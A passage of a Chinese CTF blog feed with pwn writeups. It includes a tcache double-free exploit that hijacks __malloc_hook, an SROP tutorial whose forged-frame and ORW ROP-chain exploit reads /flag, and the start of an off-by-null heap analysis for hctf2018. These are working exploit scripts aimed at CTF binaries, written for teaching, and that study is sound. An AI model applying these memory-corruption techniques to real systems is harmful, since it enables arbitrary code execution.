'</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'size?'</span>,str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx?'</span>,str(idx))</span><br><span class="line">p.sendafter(<span class="string">'content:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx?'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'4'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx?'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line">p = process(<span class="string">'vn_pwn_easyTHeap'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 1</span></span><br><span class="line"> </span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(<span class="string">'heap_addr'</span>,heap_addr))</span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment">#2</span></span><br><span class="line">edit(<span class="number">2</span>,p64(heap_addr<span class="number">-0x250</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 4</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'\x07'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x3ebca0</span></span><br><span class="line">success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(<span class="string">'libc_base'</span>,libc_base))</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4f322</span></span><br><span class="line"></span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">'__libc_realloc'</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'\x07'</span>*<span class="number">8</span>+p64(<span class="number">0</span>)*<span class="number">12</span>+p64(malloc_hook<span class="number">-0x8</span>))</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment"># 5</span></span><br><span class="line">edit(<span class="number">5</span>,p64(one_gadget)+p64(realloc+<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x66</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   rcx == NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x4f322 execve("/bin/sh", rsp+0x40, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [rsp+0x40] == NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x10a38c execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [rsp+0x70] == NULL</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;V-amp-N招新赛writeup&quot;&gt;&lt;a href=&quot;#V-amp-N招新赛writeup&quot; class=&quot;headerlink&quot; title=&quot;V&amp;amp;N招新赛writeup&quot;&gt;&lt;/a&gt;V&amp;amp;N招新赛writeup&lt;/h1&gt;&lt;p&gt;参考链接:&lt;a hr
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>SROP</title>
    <link href="https://nocbtm.github.io/2020/02/28/SROP/"/>
    <id>https://nocbtm.github.io/2020/02/28/SROP/</id>
    <published>2020-02-28T09:27:56.000Z</published>
    <updated>2020-04-11T13:41:49.269Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是SROP"><a href="#什么是SROP" class="headerlink" title="什么是SROP"></a>什么是SROP</h2><p><code>SROP</code> 全称<code>Sigreturn Oriented Programming</code>，<code>sigreturn</code>是一个系统调用，在类 unix 系统发生 signal 的时候会被间接地调用。</p><p>signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。一般来说，信号机制常见的步骤如下图所示：</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/srop-1.png" class="lozad"></p><p>包含的流程包括：</p><ol><li>内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。</li><li>内核会为该进程保存相应的上下文，将当前的信息压入栈中（栈寄存器等），以及将 sigreturn系统调用地址压入栈中。需要注意的是，这一部分是在用户进程的地址空间的。之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。</li><li>执行 sigreturn 系统调用，恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 sigreturn 的调用号为 119，64 位的系统调用号为 15。</li></ol><p>保存在栈中的进程上下文信息为<code>ucontext_t</code>结构体，称其为<code>Signal Frame</code>，其结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// defined in /usr/include/sys/ucontext.h</span></span><br><span class="line"><span class="comment">/* Userlevel context.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ucontext_t</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> uc_flags;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ucontext_t</span> *<span class="title">uc_link</span>;</span></span><br><span class="line">    <span class="keyword">stack_t</span> uc_stack;           <span class="comment">// the stack used by this context</span></span><br><span class="line">    <span class="keyword">mcontext_t</span> uc_mcontext;     <span class="comment">// the saved context</span></span><br><span class="line">    <span class="keyword">sigset_t</span> uc_sigmask;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">libc_fpstate</span> __<span class="title">fpregs_mem</span>;</span></span><br><span class="line">  &#125; <span class="keyword">ucontext_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// defined in /usr/include/bits/types/stack_t.h</span></span><br><span class="line"><span class="comment">/* Structure describing a signal stack.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="keyword">void</span> *ss_sp;</span><br><span class="line">    <span class="keyword">size_t</span> ss_size;</span><br><span class="line">    <span class="keyword">int</span> ss_flags;</span><br><span class="line">  &#125; <span class="keyword">stack_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// difined in /usr/include/bits/sigcontext.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> r8;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r9;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r10;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r11;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r12;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r13;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r14;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r15;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rdi;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rsi;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rbp;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rbx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rdx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rax;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rcx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rsp;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rip;</span><br><span class="line">  <span class="keyword">__uint64_t</span> eflags;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> cs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> gs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> fs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> __pad0;</span><br><span class="line">  <span class="keyword">__uint64_t</span> err;</span><br><span class="line">  <span class="keyword">__uint64_t</span> trapno;</span><br><span class="line">  <span class="keyword">__uint64_t</span> oldmask;</span><br><span class="line">  <span class="keyword">__uint64_t</span> cr2;</span><br><span class="line">  __extension__ <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">      <span class="keyword">__uint64_t</span> __fpstate_word;</span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="keyword">__uint64_t</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>由于<code>Signal Frame</code>是在用户态的栈中，因此若在栈中伪造<code>Signal Frame</code>，同时调<code>sigreturn</code>系统调用，即可实现对所有寄存器的控制包括rip，从而实现攻击。</p><p>如若只想调用执行一个函数，如get shell，则可直接将rip指向system，将rdi指向binsh地址即可，如下图所示。</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/srop-2.png" class="lozad"></p><p>如果想执行一系列函数，我们可以通过rsp指针来实现相应的rop链，包括两个步骤：</p><ul><li>控制栈指针。</li><li>把原来 rip 指向的syscall gadget 换成syscall; ret gadget。</li></ul><p>示意图如下所示。</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/srop-3.png" class="lozad"></p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>以V&amp;N招新赛babypwn为例</p><p>思路如下：</p><p>程序调用了syscall(15,&amp;buf),当系统调用号为15时，程序会调用_rt_sigreturn并将我们的输入作为frame传入。然后就可以伪造frame，利用SROP执行read，在libc + 0x3C6500的rw-段布置ROP chain，并返回到其位置执行ORW攻击，程序开启了Sandbox不能执行execve</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line"><span class="comment"># context.arch='i386'</span></span><br><span class="line"></span><br><span class="line">vn_pwn_babypwn_1=ELF(<span class="string">'./vn_pwn_babypwn_1'</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">    libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">elif</span> context.arch == <span class="string">'i386'</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib32/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sh</span><span class="params">(other_libc = null)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">        <span class="keyword">if</span> other_libc <span class="keyword">is</span> <span class="keyword">not</span> null:</span><br><span class="line">            libc = ELF(<span class="string">"./"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process(<span class="string">"./vn_pwn_babypwn_1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_address</span><span class="params">(sh,info=null,start_string=null,end_string=null,offset=null,int_mode=False)</span>:</span></span><br><span class="line">    sh.recvuntil(start_string)</span><br><span class="line">    <span class="keyword">if</span> int_mode :</span><br><span class="line">        return_address=int(sh.recvuntil(end_string).strip(end_string),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">elif</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">        return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    log.success(info+str(hex(return_address+offset)))</span><br><span class="line">    <span class="keyword">return</span> return_address+offset</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(sh)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'cat /flag'</span>)</span><br><span class="line">    <span class="keyword">return</span> sh.recvrepeat(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_gdb</span><span class="params">(sh,stop=False)</span>:</span></span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    <span class="keyword">if</span> stop :</span><br><span class="line">        raw_input()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    sh = get_sh()</span><br><span class="line">    get_gdb(sh)</span><br><span class="line">    libc.address = get_address(sh,<span class="string">'The libc base address is '</span>,<span class="string">'Here is my gift: 0x'</span>,<span class="string">'\n'</span>,-libc.symbols[<span class="string">'puts'</span>],<span class="keyword">True</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Please input magic message: '</span>)</span><br><span class="line">    fake_frame  = p64(<span class="number">0</span>) * <span class="number">12</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RDI = RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RSI = RDI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)          <span class="comment"># RDX = RSI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x100</span>)                                   <span class="comment"># RCX = RDX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span>)                 <span class="comment"># RSP</span></span><br><span class="line">    fake_frame += p64(libc.symbols[<span class="string">'syscall'</span>])                 <span class="comment"># RIP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># eflags</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x33</span>)                                    <span class="comment"># cs : gs : fs</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">    <span class="comment"># get_gdb(sh)</span></span><br><span class="line">    sh.send(fake_frame)</span><br><span class="line">    ROP_chain  = <span class="string">'/flag\x00\x00\x00'</span></span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'open'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">3</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'read'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">1</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'write'</span>])</span><br><span class="line">    <span class="comment">#raw_input('&gt;')</span></span><br><span class="line">    sh.send(ROP_chain)</span><br><span class="line">    <span class="keyword">print</span> sh.recv()</span><br></pre></td></tr></table></figure><p>参考文章  :</p><p><a href="https://ray-cp.github.io/archivers/srop-analysis" target="_blank" rel="noopener">https://ray-cp.github.io/archivers/srop-analysis</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;什么是SROP&quot;&gt;&lt;a href=&quot;#什么是SROP&quot; class=&quot;headerlink&quot; title=&quot;什么是SROP&quot;&gt;&lt;/a&gt;什么是SROP&lt;/h2&gt;&lt;p&gt;&lt;code&gt;SROP&lt;/code&gt; 全称&lt;code&gt;Sigreturn Oriented Progr
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>off-by-null</title>
    <link href="https://nocbtm.github.io/2020/02/28/off-by-null/"/>
    <id>https://nocbtm.github.io/2020/02/28/off-by-null/</id>
    <published>2020-02-28T08:47:12.000Z</published>
    <updated>2020-04-07T03:40:06.561Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>off by null 是一个比较有意思的技术 下面通过 hctf2018 的 heapstrom_zero 实战一波。</p><p>题目链接 <a href="https://github.com/veritas501/hctf2018" target="_blank" rel="noopener">https://github.com/veritas501/hctf2018</a></p><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>直接拿源码分析，程序是一个比较简单的菜单程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">int main(void)&#123;</span><br><span class="line">init();</span><br><span class="line">while(1)&#123;</span><br><span class="line">switch(menu_getinput())&#123;</span><br><span class="line">case 1:&#123;</span><br><span class="line">Allocate();</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">case 2:&#123;</span><br><span class="line">View();</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">case 3:&#123;</span><br><span class="line">Delete();</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">case 4:&#123;</span><br><span class="line">puts(&quot;Bye!&quot;);</span><br><span class="line">exit(0);</span><br><span class="line">&#125;</span><br><span class="line">default:&#123;</span><br><span class="line">puts(&quot;Invaild choice!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先初始化一些东西，比如随机 mmap 一块内存用来存放指针之类的。然后提供三个选项供用户选择。</p><h3 id="init"><a href="#init" class="headerlink" title="init"></a>init</h3><p>看看 init 函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">sum=<span class="number">0</span>;</span><br><span class="line">setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">"/dev/urandom"</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Open urandom error!!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> * pageaddr;</span><br><span class="line"><span class="keyword">if</span>(read(fd,&amp;pageaddr,<span class="keyword">sizeof</span>(<span class="keyword">void</span> *)) == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Read urandom error!!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">pageaddr = (<span class="keyword">void</span> *)(((<span class="keyword">size_t</span>)(pageaddr)&amp;~<span class="number">0xfff</span>)%<span class="number">0x133700000000</span>);</span><br><span class="line"><span class="comment">// 随机mmap 一块内存，存放程序分配的内存指针</span></span><br><span class="line">page = mmap(pageaddr,<span class="number">0x1000</span>,<span class="number">3</span>,<span class="number">34</span>,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(page != pageaddr)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"mmap error!!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 随机生成秘钥，用于加密指针</span></span><br><span class="line"><span class="keyword">if</span>(read(fd,&amp;(page-&gt;xorkey),<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)) == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Read urandom error!!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x20</span>;i++)&#123;</span><br><span class="line">page-&gt;chunk[i]=(<span class="keyword">char</span> *)page-&gt;xorkey;</span><br><span class="line">&#125;</span><br><span class="line">bar();</span><br><span class="line">close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分配一块内存，然后生成一个随机秘钥，秘钥的作用是把程序分配的内存的指针异或加密一下。</p><h3 id="Allocate"><a href="#Allocate" class="headerlink" title="Allocate"></a>Allocate</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 